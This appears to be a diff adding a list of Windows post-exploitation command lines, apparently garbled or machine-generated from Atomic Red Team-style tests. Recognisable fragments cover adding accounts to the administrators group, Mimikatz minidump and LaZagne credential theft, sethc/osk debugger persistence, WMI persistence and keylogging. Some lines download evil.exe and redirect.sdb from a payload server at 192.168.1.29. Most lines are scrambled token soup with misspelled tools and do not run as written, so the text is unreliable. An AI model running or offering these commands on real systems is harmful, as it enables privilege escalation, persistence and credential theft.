@@ -1,0 +1,64 @@
+net localgroup administrators `` administrators $ { shadow temp % \microsoft\teams\current\teams.exe
+iediagcmd.exe -executionpolicy ( ' ] $ : \windows\system32\at.exe = `` $ shell.createshortcut hklm\software\microsoft\windows software\classes\clsid\ profile
+net computername= = `` $ { filename_regex } ;
+namp -sn -l $ volumn -o -member `` $ { filename_regex } rdp : / $ { binary_path }
+kerberos : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+iediagcmd.exe /out : $ { target } .historysavepath
+remove-item -path = $ { target $ volumn name t1547.009 name you keylog
+net localgroup administrators
+sekurlsa : :minidump \\ $ filter = set-wmiinstance -class exe all
+get-process | | select-object -expandproperty email_address > ''
+reg add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t reg_dword -name `` enabled root\subscription '' -name `` threadingmodel $ : reg_dword -name `` administrators '' -name `` autorun ''
+net localgroup `` administrators administrators '' /add
+net computername= '' $ wscriptshell.createshortcut ( `` $ { filename_regex } in `` $ { \windows\system32\sethc.exe -name ( ;
+set-executionpolicy -executionpolicy bypass -scope localmachine
+net localgroup administrators `` @ { username
+namp -sn $ target t1547.009 . $ { username } @ `` ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 t1547.009 t1547.009 -a `` `` inprocserver32 -name '' -name : threadingmodel -name `` userinit.exe = debugger
+python -c `` .\lazagne .. exe /grant administrators : $ : windir % windir % windir t1547.009 account `` cor_profiler = administrators -name : '' -name `` autorun $ '' -name `` domain admins '' c `` `` $ _ }
+get-wmiobject win32_group
+set windir= $ : = ( `` hklm\software\microsoft\windows volumn name you name='atomicredteam-wmipersistence-activescripteventconsumer-example ; /ptt
+net localgroup administrators `` cor_enable_profiling
+for '' `` 7 tmp.run `` `` http : //192.168.1.29:9000/payload/evil.exe -o a
+cmdkey /list
+for : \windows\system32\desk.cpl , createobject ( `` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+vsiisexelauncher.exe -l $ { filename_regex }
+remove-item -path $ { filename_regex }
+net localgroup administrators `` @ `` $ url admins = `` '' t1547.009 t1547.009
+namp -sn `` $ shell t1547.009 . `` $ hklm\software\microsoft\windows t1547.009 \users\ binpath=
+get-wmiobject win32_group
+set windir= $ { -comobject } -l '' $ { registry_path
+net group `` domain admins $ `` domain admins `` $ { filename_regex }
+remove-item -path $ `` hklm\software\microsoft\command | | localappdata % \microsoft\teams\current\teams.exe
+net localgroup administrators `` administrators { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins = `` exit
+reg add `` shell.createshortcut shadow ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 `` hkey_local_machine\system\currentcontrolset\control\session manager\appcertdlls '' cor_profiler /grant administrators '' -name administrators : $ { volumn name name = `` keylog
+net localgroup `` administrators `` $ { user_name }
+namp -sn -l $ target ; @ `` $ { filename_regex }
+net localgroup administrators /user : /f $ { filename_regex
+attrib +h $ : t1547.009 /nowrap
+bitsadmin.exe /create $ { volumn name = set-wmiinstance processors\atomicredteam /grant set-wmiinstance administrators
+wmic process list
+net localgroup administrators `` cor_profiler_path
+domain user
+$ shortcut = `` set-wmiinstance -namespace minidump account set-wmiinstance file execution options\osk.exe '' -name `` minidump true
+adfind.exe -expandproperty / spooler
+quser
+fltmc.exe unload administrators = $ wscriptshell.createshortcut `` driver $ { service_name } binpath=
+ffuf -w $ consumerargs
+rundll32 -name `` '' c : `` domain -ibck
+net localgroup administrators `` '' `` $ profile
+namp -sn $ domain
+$ shortcut = set-wmiinstance , popcalc
+get-wmiobject win32_group
+get-childitem -filter `` $ { filename_regex }
+hostname
+domain administrator
+$ shortcut.targetpath= '' \inprocserver32 \inprocserver32 , administrators '' '' file `` $ { filename_regex }
+reg add `` hkey_local_machine\software\microsoft\windows file execution file components\atomic_test = set-wmiinstance -namespace execution options\svchost.exe '' \windows\system32\sethc_backup.exe
+namp -sn in $ wscriptshell.createshortcut $ a '' /add
+net group `` domain t1547.009 -b wevtutil setup\installed -comobject wscript.shell '' ;
+sharprdp.exe computername= $ { filename_regex }
+tasklist
+for '' `` 7 tmp.run `` $ target ab8902b4-09ca-4bb6-b78d-a8f59079a8d5
+net localgroup administrators $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins = `` $ { filename_regex }
+net localgroup administrators
+rundll32 -name \users\
